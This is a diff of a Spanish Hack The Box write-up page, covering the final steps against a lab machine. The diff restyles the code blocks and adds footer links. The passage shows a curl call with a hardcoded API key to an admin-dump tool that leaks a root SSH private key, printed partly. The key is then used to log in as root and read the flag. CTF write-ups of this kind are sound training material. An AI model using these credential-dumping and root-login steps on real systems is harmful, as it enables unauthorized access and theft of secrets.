 <p>Usamos un pequeño one-liner de Python (<code>python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])"</code>) al final del comando <code>curl</code> para parsear limpiamente el JSON y que la clave se imprima con los saltos de línea correctos.</p>
-<pre><code class="language-bash">curl -s -X POST http://127.0.0.1:5000/tools/call \
-  -H &quot;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot; \
-  -H &quot;Content-Type: application/json&quot; \
-  -d '{&quot;name&quot;: &quot;ops._admin_dump&quot;, &quot;arguments&quot;: {&quot;target&quot;: &quot;ssh_keys&quot;, &quot;confirm&quot;: true}}' | python3 -c &quot;import sys, json; print(json.load(sys.stdin)['root_private_key'])&quot;
-</code></pre>
-<pre><code class="language-text">-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
-G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
-8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
-[... recortado ...]
------END OPENSSH PRIVATE KEY-----
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://127.0.0.1:5000/tools/call<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;: &quot;ops._admin_dump&quot;, &quot;arguments&quot;: {&quot;target&quot;: &quot;ssh_keys&quot;, &quot;confirm&quot;: true}}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys, json; print(json.load(sys.stdin)[&#39;root_private_key&#39;])&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>-----BEGIN OPENSSH PRIVATE KEY-----
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>[... recortado ...]
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>-----END OPENSSH PRIVATE KEY-----
+</code></pre></div>
 <p><img alt="Salida curl clave RSA" src="cap6.png" /></p>
-<h3 id="acceso-final">Acceso Final</h3>
+<h3 id="acceso-final">Acceso Final<a class="headerlink" href="#acceso-final" title="Permanent link">&para;</a></h3>
 <p>Copiamos toda la clave RSA proporcionada por el servidor, abrimos una nueva pestaña en nuestra máquina atacante y la guardamos en un archivo (por ejemplo, <code>ssh.txt</code>).</p>
 <p>Es crucial recordar que SSH exige que las claves privadas tengan permisos restrictivos, por lo que debemos aplicar un <code>chmod 600</code> antes de usarla. Finalmente, nos conectamos por SSH como <code>root</code>.</p>
-<pre><code class="language-bash"># En la máquina atacante
-nvim ssh.txt
-# (Pegamos el contenido de la clave)
-
-chmod 600 ssh.txt 
-ssh root@10.129.3.242 -i ssh.txt 
-</code></pre>
-<pre><code class="language-text">The authenticity of host '10.129.3.242 (10.129.3.242)' can't be established.
-ED25519 key fingerprint is: SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.3.242' (ED25519) to the list of known hosts.
-Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
-
-root@devhub:~# whoami
-root
-root@devhub:~# ls
-root.txt  snap
-root@devhub:~# cat root.txt
-[REDACTED]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># En la máquina atacante</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>nvim<span class="w"> </span>ssh.txt
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="c1"># (Pegamos el contenido de la clave)</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>ssh.txt<span class="w"> </span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>ssh<span class="w"> </span>root@10.129.3.242<span class="w"> </span>-i<span class="w"> </span>ssh.txt<span class="w"> </span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>The authenticity of host &#39;10.129.3.242 (10.129.3.242)&#39; can&#39;t be established.
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>ED25519 key fingerprint is: SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>This key is not known by any other names.
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>Warning: Permanently added &#39;10.129.3.242&#39; (ED25519) to the list of known hosts.
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>root@devhub:~# whoami
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>root
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>root@devhub:~# ls
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>root.txt  snap
+<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>root@devhub:~# cat root.txt
+<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>[REDACTED]
+</code></pre></div>
 <p><img alt="Flag Root" src="cap7.png" /></p>
 <hr />
 <div align="center">
@@ -1505,6 +1558,9 @@ root@devhub:~# cat root.txt
 
 
 
+  
+  
+
 
 
 
@@ -1518,18 +1574,92 @@ root@devhub:~# cat root.txt
 <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
         
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
       </main>
       
         <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../Checkpoint/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Checkpoint">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                Checkpoint
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../Hard/Nimbus/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: Nimbus">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                Nimbus
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
+    <div class="md-copyright__highlight">
+      © 2026 D4vKry · Contenido con fines educativos en entornos controlados
+    </div>
   
-    Made with
-    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-      Material for MkDocs
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/D4vKry" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://app.hackthebox.com/public/users/2410065" target="_blank" rel="noopener" title="Hack The Box" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://es.linkedin.com/in/david-veiga-otero-160036257" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
     </a>
   
 </div>
@@ -1547,7 +1677,7 @@ root@devhub:~# cat root.txt
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.top", "navigation.footer", "navigation.tracking", "toc.follow", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
       <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
